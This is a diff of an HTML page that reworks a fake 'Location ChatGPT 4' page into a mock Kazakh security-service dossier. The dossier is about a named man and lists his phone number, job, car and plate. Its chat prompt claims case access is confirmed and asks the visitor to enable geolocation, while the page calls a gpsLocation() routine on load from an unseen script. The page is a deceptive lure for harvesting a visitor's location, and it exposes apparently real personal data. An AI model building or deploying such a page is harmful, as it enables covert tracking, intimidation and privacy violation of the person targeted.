@@ -1,49 +1,158 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Find - people</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Досье</title>
   <link rel="stylesheet" href="./style.css">
-
 </head>
 <body onload="gpsLocation()">
-<section class="msger">
-  <header class="msger-header">
-    <div class="msger-header-title">
-      <i class="fas fa-comment-alt"></i> Location ChatGPT 4
-    </div>
-    <div class="msger-header-options">
-      <span><i class="fas fa-cog"></i></span>
-    </div>
-  </header>
 
-  <main class="msger-chat">
-    <div class="msg left-msg">
-      <div
-       class="msg-img"
-       style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"
-      ></div>
+<div class="dossier-wrapper">
 
-      <div class="msg-bubble">
-        <div class="msg-info">
-          <div class="msg-info-name">Admin</div>
-          <div class="msg-info-time"></div>
+  <!-- ===== ШАПКА ===== -->
+  <div class="dossier-header">
+    <div class="header-left">
+      <div class="agency-logo">&#9632;</div>
+      <div class="agency-name">УПРАВЛЕНИЕ<br>БЕЗОПАСНОСТИ</div>
+    </div>
+    <div class="header-center">
+      <div class="stamp-secret">ҚР БП ҚСжАЕК</div>
+      <div class="dossier-title">ДОСЬЕ</div>
+      <div class="dossier-number">Дело № 2024-0847</div>
+    </div>
+    <div class="header-right">
+      <div class="barcode">|||  ||| || |||||  |||</div>
+      <div class="doc-date">Дата: 20.04.2026</div>
+    </div>
+  </div>
+
+  <!-- ===== ТЕЛО ДОСЬЕ ===== -->
+  <div class="dossier-body">
+
+    <!-- Левая колонка: фото + статус -->
+    <div class="dossier-left">
+      <div class="photo-frame">
+        <div class="photo-inner">
+          <!-- Замените src на ссылку/путь к фото объекта -->
+          <img src="" alt="" id="subject-photo" onerror="this.style.display='none'">
+          <div class="photo-placeholder-text">ФОТО</div>
         </div>
+        <div class="photo-caption">Объект наблюдения</div>
+      </div>
 
-        <div class="msg-text">
-          Hi Welcome to Location GPT-4. Turn on your location for find people near you.📍
+      <div class="status-box">
+        <div class="status-label">СТАТУС</div>
+        <!-- Измените статус: АКТИВНЫЙ / ЗАКРЫТ / ПОД НАБЛЮДЕНИЕМ -->
+        <div class="status-value">АКТИВНЫЙ</div>
+      </div>
+
+      <div class="threat-level">
+        <div class="threat-label">АКТИВНОСТЬ ЦЕЛИ</div>
+        <div class="threat-bars">
+          <div class="bar bar-fill"></div>
+          <div class="bar bar-fill"></div>
+          <div class="bar"></div>
+          <div class="bar"></div>
         </div>
       </div>
     </div>
 
-  </main>
+    <!-- Правая колонка: поля данных -->
+    <div class="dossier-right">
+      <div class="section-title">&#9670; ЛИЧНЫЕ ДАННЫЕ</div>
 
-  <form class="msger-inputarea">
-    <input type="text" class="msger-input" placeholder="Ask me anything...">
-    <button type="submit" class="msger-send-btn">Send</button>
-  </form>
-</section>
-<script  src="./script.js"></script>
+      <!-- ============================================================ -->
+      <!-- ЗАПОЛНИТЕ ПОЛЯ ВРУЧНУЮ — меняйте текст внутри тегов <span>  -->
+      <!-- ============================================================ -->
+
+      <div class="field-row">
+        <span class="field-label">Фамилия, Имя, Отчество</span>
+        <span class="field-value">Ахмет</span>
+      </div>
+      <div class="field-row">
+        <span class="field-label">Дата рождения</span>
+        <span class="field-value">01.01.1990</span>
+      </div>
+      <div class="field-row">
+        <span class="field-label">Пол</span>
+        <span class="field-value">Мужской</span>
+      </div>
+      <div class="field-row">
+        <span class="field-label">Гражданство</span>
+        <span class="field-value">Республика Казахстан</span>
+      </div>
+      <div class="field-row">
+        <span class="field-label">Место рождения</span>
+        <span class="field-value"> ---</span>
+      </div>
+
+      <div class="section-title">&#9670; КОНТАКТНЫЕ ДАННЫЕ</div>
+
+      <div class="field-row">
+        <span class="field-label">Адрес проживания</span>
+        <span class="field-value"> --- </span>
+      </div>
+      <div class="field-row">
+        <span class="field-label">Номер телефона</span>
+        <span class="field-value">+7 (708) 407-16-04</span>
+      </div>
+      <div class="field-row">
+        <span class="field-label">Email</span>
+        <span class="field-value"> --- </span>
+      </div>
+
+      <div class="section-title">&#9670; ДОПОЛНИТЕЛЬНО</div>
+
+      <div class="field-row">
+        <span class="field-label">Место работы</span>
+        <span class="field-value">---</span>
+      </div>
+      <div class="field-row">
+        <span class="field-label">Должность</span>
+        <span class="field-value">Механик</span>
+      </div>
+      <div class="field-row">
+        <span class="field-label">Транспортное средство</span>
+        <span class="field-value">Toyota Camry, 701ACE| 19</span>
+      </div>
+      
+    </div>
+  </div>
+
+  <!-- ===== ЧАТ-РАЗДЕЛ (функционал полностью сохранён) ===== -->
+  <div class="dossier-chat-section">
+    <div class="chat-section-title">&#9670; ЗАПРОС ИНФОРМАЦИИ</div>
+
+    <section class="msger">
+      <main class="msger-chat">
+        <div class="msg left-msg">
+          <div class="msg-img" style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"></div>
+          <div class="msg-bubble">
+            <div class="msg-info">
+              <div class="msg-info-name">Система</div>
+              <div class="msg-info-time"></div>
+            </div>
+            <div class="msg-text">
+              Доступ к делу подтверждён. Включите геолокацию для верификации личности.&#128205;
+            </div>
+          </div>
+        </div>
+      </main>
+
+      <form class="msger-inputarea">
+        <input type="text" class="msger-input" placeholder="Введите запрос...">
+        <button type="submit" class="msger-send-btn">Отправить</button>
+      </form>
+    </section>
+  </div>
+
+  <!-- ===== НИЖНИЙ КОЛОНТИТУЛ ===== -->
+  
+
+</div>
+
+<script src="./script.js"></script>
 <p id="techchip"></p>
 <!-- tc_payload -->
 
